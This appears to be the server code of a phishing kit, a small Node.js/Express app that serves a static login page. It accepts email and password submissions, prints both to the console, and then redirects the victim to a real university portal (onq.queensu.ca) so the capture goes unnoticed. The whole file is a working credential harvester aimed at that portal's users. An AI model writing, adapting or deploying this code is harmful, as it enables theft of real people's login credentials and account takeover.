const express = require('express');
const http = require('http');
const port = 3000
const app = express();
var sleep = require('system-sleep');

var bodyParser = require('body-parser')

app.use(bodyParser.json() );       
app.use(bodyParser.urlencoded({
  extended: true
})); 
;

app.use(express.static('login'));

app.post('/userlogin', function(req, res) {
    var email = req.body.email;
	var password = req.body.password;
	console.log(email);
	console.log(password);
	sleep(1*1000);
	res.redirect('http://onq.queensu.ca'+req.url)
});

app.listen(port, () => {
	console.log(`Static files available at http://localhost:${port}/`);
});